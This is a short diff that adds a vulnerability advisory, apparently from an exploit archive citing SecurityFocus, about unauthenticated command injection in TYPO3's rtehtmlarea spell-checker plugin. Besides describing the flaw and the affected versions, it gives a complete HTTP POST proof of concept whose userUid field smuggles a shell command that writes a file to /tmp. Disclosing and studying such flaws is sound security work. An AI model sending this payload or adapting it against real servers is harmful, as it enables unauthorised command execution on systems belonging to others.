@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/21680/info
+
+TYPO3 is prone to multiple vulnerabilities that allow attackers to execute arbitrary commands. This issue occurs because the application fails to properly sanitize user-supplied data.
+
+Exploiting these issues allows unauthenticated attackers to execute arbitrary system commands with the privileges of the application.
+
+Versions 4.0 to 4.0.3 and 4.1beta are vulnerable; versions 3.7 and 3.8 are also vulnerable if they have the optional 'rtehtmlarea' extension installed.
+
+POST /typo3/sysext/rtehtmlarea/htmlarea/plugins/SpellChecker/spell-
+check-logic.php?id=1 HTTP/1.1
+Host: www.example.com
+User-Agent: none
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 111
+
+psell_mode=fast&to_p_dict=1&cmd=learn&userUid=test;+echo+'shell'+>+
+/tmp/shell.txt+%23&enablePersonalDicts=true
